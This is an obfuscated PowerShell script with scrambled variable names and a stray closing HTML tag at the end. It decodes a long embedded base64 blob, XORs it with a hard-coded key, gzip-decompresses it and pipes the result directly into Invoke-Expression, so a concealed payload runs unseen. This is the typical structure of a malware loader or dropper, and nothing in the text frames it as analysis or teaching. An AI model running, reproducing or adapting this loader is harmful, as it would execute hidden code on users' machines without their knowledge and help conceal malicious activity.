$kt06c1ams7zjfbh = [System.Text.Encoding]::ascii
function v5936cl7myrg8nkiuxfez4pdsbo  {param($kv7l4mh6p5agyo0 )
  $nf7dxkuov8ai4yt = [System.Convert]::FromBase64String($kv7l4mh6p5agyo0)
  $csnrw8061i3tumx= $kt06c1ams7zjfbh.GetBytes("gfl6iakuw1v9")
    $wq8o0dv4gfb1lun = $nf7dxkuov8ai4yt
    $oh9fc2dwtzu3pkr = $(for ($6vx59r8sjalwbfy = 0; $6vx59r8sjalwbfy -lt $wq8o0dv4gfb1lun.length; ) {
        for ($mj0atchrksgxd47 = 0; $mj0atchrksgxd47 -lt $csnrw8061i3tumx.length; $mj0atchrksgxd47++) {
            $wq8o0dv4gfb1lun[$6vx59r8sjalwbfy] -bxor $csnrw8061i3tumx[$mj0atchrksgxd47]
            $6vx59r8sjalwbfy++
            if ($6vx59r8sjalwbfy -ge $wq8o0dv4gfb1lun.Length) {
                $mj0atchrksgxd47 = $csnrw8061i3tumx.length
            }
        }
    })
	$jby40e7tvsfxc8w = New-Object System.IO.MemoryStream( , $oh9fc2dwtzu3pkr )

	    $2yrki5lcu81xze7 = New-Object System.IO.MemoryStream
        $9liuecqrt452p61 = New-Object System.IO.Compression.GzipStream $jby40e7tvsfxc8w, ([IO.Compression.CompressionMode]::Decompress)
	    $9liuecqrt452p61.CopyTo( $2yrki5lcu81xze7 )
        $9liuecqrt452p61.Close()
		$jby40e7tvsfxc8w.Close()
		[byte[]] $rpncvsi2504d9xa = $2yrki5lcu81xze7.ToArray()
 $8kyho7clxtdqr6n=$rpncvsi2504d9xa
    return $8kyho7clxtdqr6n
}
[byte[]]$fn9luqo60s23z7h=v5936cl7myrg8nkiuxfez4pdsbo $l9q8j53tmdkz4fr
[System.Text.Encoding]::ascii.GetString((v5936cl7myrg8nkiuxfez4pdsbo "eO1kNmlha3VzMftsvBTPDnkcNd+PNuPzPKeHt6voTKK9spsY7gGPekfP9qyCldBdd0Z3MvjlROaCjjlKFoSMT2E1ah/Cf+kHunTWkKqMDKkiHZdxHarzhqWqew+hBHJuLWLlu2+W5MmSHT3foOIZYINiAbEjtP/uS9t2pG04c2UDv7A2TM8EWuSJOSx5RmW2loadwv0p/ESco9znLTcF1uEYFWU5CbP0+yTi9BUFP82/lTkxVB+Am6tYBSMTuyYMTYllz8llM/n6bknYFEx4TjXpT5tmeHkC8i1xizBE06sHXVqn6XW3rR5jFKf5A4jH6xHMHSlH2VVTLHZTfxhOduuikoeUuE6vNHRBEJdrDZlEhRUMRNOv8ONJZCEPt+xRLNR+A/e7L8zWqb9ZjhPiHL3b3jXam4+7MZEGg7eBlDvgQOvWRFRLfUnTamqgcGlS59OZm7+6ktcuR0Iwj8hK4Sx3UPn8Ec2bs/QTjQ+cUdlJ5jPO2f7bnJC/xalbmIxYnE/E/G0eaqDChIhP2GjUYk3rH5jOra6HLH4xXWGjVoqrcZANBnp1sNRd21h8r1F0syRqhP78HUuJ6au1aO2dJ+WeLDWjjXG9QyAKCaDZKZgKNYAGtpW0O+AZB4kvBieYJaUjv2OwUhsnD0kcDox9c9f2msTZ9EW2JptnkVZrFEIVpV13BRzSgWFywoMtSmBktVsxJV0vjaETkVYThyCixp+aNCNd6rPr70/kZQkMScHHxOWcX/kyPjEJjf1nvul9vjUeXqKc6OowUKM3sU7Fwm6LZOVULXwzr0afAKZgjHRHA4kYNiAbBvnYwlK9xgCXEsfU3TyIqkKGDQWNLU9ev/1V9TFctd23fxrtFUEvbuBlux5k1+6mVG/+gq/PB40mLBsctq8Q/T9nZvurKCo8YUwDDuFDDtZzbrpoNt1MNpwnKQWgTAXFzagfxUBxrqEDh9QPXmlsl49E8enCZFgA7Z+RpYwD6J1lOxJrwJyj1sl9z4vv2BWw7YANs3ibWpHHqXiw/QY2qpcYVpzlX1sX7jTZ9u6p0WSG+YHWoE9qQRE/kn5I3VZrdoI3T1zr+910YlaiT6lq8kK3PRde/lRtcjQbbvAKGHj3yCtLWgzzNM9B0YVdIavDB3I3VOMr7TpoNuY2BufBK51c0nHCWObvPdM2eo71I3M8i+xMvWiX8TRIzFht3ofm+6Crdgwhqwg4BApZxDZma3U="))|iex;
</body>